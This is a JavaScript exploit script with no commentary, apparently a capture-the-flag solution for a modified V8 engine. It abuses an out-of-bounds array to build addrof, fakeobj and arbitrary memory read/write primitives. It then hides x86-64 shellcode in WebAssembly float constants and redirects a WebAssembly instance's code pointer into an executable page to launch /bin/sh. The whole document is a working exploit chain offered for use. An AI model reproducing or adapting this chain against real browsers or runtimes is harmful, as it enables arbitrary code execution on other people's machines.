var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + val.toString(16);
}

var a = [1.1, 2.2];
var b = [buf];

a.length = 0xffffff;

var float_arr_map = a[2];
var fake_arr = [float_arr_map, 1.1, 2.2, 3.3];
function addrof(obj) {
    b[0] = obj;
    return ftoi(a[5]) & 0xFFFFFFFFn;
}

function fakeobj(addr) {
    const c = ftoi(a[5]) & 0xFFFFFFFFn;
    a[5] = itof(c | BigInt(addr));
    return b[0];
}

const fake = fakeobj(addrof(fake_arr) - 0x20n)
function read(addr) {
    a[15] = itof(((addr - 8n) & 0xFFFFFFFFn) | (100n << 32n));
    return ftoi(fake_arr[0]);
}
function write(addr, val) {
    a[15] = itof(((addr - 8n) & 0xFFFFFFFFn) | (100n << 32n));
    fake_arr[0] = itof(val);
}

var wasm_code = new Uint8Array(
    [0, 97, 115, 109, 1, 0, 0, 0, 1, 11, 1, 96, 0, 7, 124, 124, 124, 124, 124, 124, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 67, 1, 65, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 6, 68, 80, 72, 137, 231, 49, 210, 235, 6, 68, 72, 1, 216, 72, 49, 219, 235, 6, 68, 72, 193, 224, 24, 144, 144, 235, 6, 11, 0, 10, 4, 110, 97, 109, 101, 2, 3, 1, 0, 0]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm = wasm_instance.exports.main;

var rwx_addr = read(addrof(wasm_instance) + 96n);
var shellcode_addr = rwx_addr + 0x849n;

var wasm_code2 = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 11, 1, 96, 0, 7, 124, 124, 124, 124, 124, 124, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 67, 1, 65, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 11, 0, 10, 4, 110, 97, 109, 101, 2, 3, 1, 0, 0]);
var wasm_mod2 = new WebAssembly.Module(wasm_code2);
var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
write(addrof(wasm_instance2) + 96n, shellcode_addr)
for(let i = 0; i < 100000; i++) wasm();
for(let i = 0; i < 100000; i++)
wasm_instance2.exports.main();